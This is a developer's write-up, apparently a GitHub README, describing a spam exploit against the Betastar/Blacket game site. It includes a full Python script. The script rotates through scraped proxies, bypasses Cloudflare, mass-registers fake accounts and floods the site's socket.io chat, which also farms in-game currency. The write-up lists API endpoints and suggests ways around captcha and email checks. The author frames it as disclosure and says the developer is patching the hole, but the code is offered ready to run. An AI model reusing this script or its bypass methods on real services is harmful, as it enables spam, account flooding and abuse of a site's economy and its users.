## I (l2vy7) discovered a HUGE spam exploit on Betastar.
All Betastar/Blacket API endpoints are insecure, and everyone knows that.  
But now, since Betastar has a chat function, and its insecurity makes exploits very awful.  


### How it's made: TrollSense for Betastar
Basically, I made a separate (private) proxy generator, and copied over the proxies to proxies.txt in the folder, and set up a proxy looper.  
I also implemented a CloudFlare bypassing ```requests``` wrapper because I'm not waiting hours for Undetected ChromeDriver to work.  
Since all logins are ip-based, and each time you load a page in Betastar, it checks with the login information provider, you don't even have to work with any HTTP cookies or anything. Just direct IPs, you can even skip the login information checking process if you want.  
After that, I just loop through the proxies, make accounts with random names and the password "THEWORLDISONFIRE", check for invalid proxies, rinse and repeat.  
Then, I find existing accounts and extend the current accounts if the accounts file exists.  
Finally, I loop through the working ips with accounts linked to them, use a requests session to connect to the chat server via a socketio-python client and the current proxy, and emit "smes" with a set message attached.  
The funny thing is that each chat message gives you 1 "atom" (currency of Betastar), and you can trade them in almost the same way you use the chat, by connecting with socket.io. I don't have the time or patience to implement trading yet, but it goes like so:

the trade menu is almost handled the same way as the chat, you just emit ```trade``` with the value of the user you want to request, ```cancelTrade``` to cancel the trade, handle ```accepted``` for when the trade is accepted, handle ```tradeCancelled``` for when the trade is cancelled, etc.

a get request to ```/api/claim``` automatically claims a daily reward
a get request to ```/api/user?name=(username)``` lists the stats of a user (equivalent to ```f4``` in game for the api)
a get request to ```/api/news``` lists the news posts
a get request to ```/api/lcheck``` checks if you're logged in
a get request to ```/api/elements``` gets a list of all the buyable elements
a get request to ```/api/crates``` gets a list of all the buyable crates
a get request to ```/lib/api/config``` does nothing it seems unless you're the owner.
a post request to ```/api/sell/``` with the data ```element=(element)&quantity=(quantity)``` sells an element with a specified quantity

Xotic did send me, while we were talking over Discord, a list of all the endpoints. Unfortunately, I am busy and don't have the time to document ALL of them and what they do, but I do have the list of every endpoint in the API.

![image](https://user-images.githubusercontent.com/102484505/171060995-2f8df054-8ba4-46bf-a461-b03cd3827685.png)


### How it stopped being made: Communication with Xotic.
He will implement captchas (can be bypassed with 2captcha and/or API endpoints will be left vulnerable) on registration pages, along with possible email verification (can be bypassed by Tempmail APIs). However, the API endpoints may still be insecure. I will update this if necessary and will try to give Xotic instructions on how to fix it.
Though I'm not entirely sure if this will affect socket.io data or the registration API, I'm 99% sure he will do something to stop this from working.  

I just kept this here as a documentation on how vulnerable websites can be easily exploited.  
**I'm helping Xotic fix this. Please note that I meant no harm in making this exploit.**

## The full code
I know you skids want the code, so here we go.  
This took around 45 minutes to an hour to develop and proxy scraping took like 30 minutes.

```py
from requests.exceptions import *
from os.path import exists
from faker import Faker
import cloudscraper
import traceback
import requests
import socketio
import logging
import random
import string
import base64
import sys

fake = Faker()

ips = []

for x in open('proxies.txt', 'r').read().split('\n'):
    scraper = cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'android',
            'desktop': False
        },
        disableCloudflareV1=True
    )

    try:
        resp = scraper.post("http://betastar.org/api/register/", headers = {"User-Agent" : fake.chrome()}, data=("username=" + ''.join(random.choices(string.ascii_uppercase + string.digits, k = 7)) + "&password=" + base64.b64encode("THEWORLDISONFIRE".encode("utf-8")).decode("utf-8") ), proxies={"http" : 'http://'+x})
        print('Account created.')
        ips.append(x)
    except ProxyError as e:
        pass
    except HTTPError as e:
        pass
    except TooManyRedirects as e:
        pass
    except Exception as e:
        pass

if exists('accounts.txt'):
    ips.extend(open('accounts.txt', 'r').read().split('\n'))

for x in ips:
    with open('accounts.txt', 'w') as x1:
        x1.write(x + '\n')
    session = requests.session()
    session.proxies = {"http" : "http://"+x}
    sio = socketio.Client(http_session=session)
    sio.connect(
        'http://betastar.org/chat/',
        transports='websocket'
    )
    sio.emit('smes', 'Insecure API endpoint test worked.')
    sio.disconnect()
```

## What happens next?

What Xotic is implementing now:
- Proxy blacklists (from the code of my proxy scraper)
- Cooldown spam mutes/bans
- Prevention of using the same IP for multiple accounts (1 alt maximum per IP)
- socket.io socket security

We've talked this over together and found this to be a good idea and good things to implement.  
Therefore, this exploit will be patched very soon. Don't worry, this is just a documentation of how the API COULD be exploited, and I have done nothing to ruin the economy or harm the website in any way.

**Some of this was made from what I posted on my pr ([here](https://github.com/XOTlC/Blacket/pull/51#issuecomment-1141480027))**
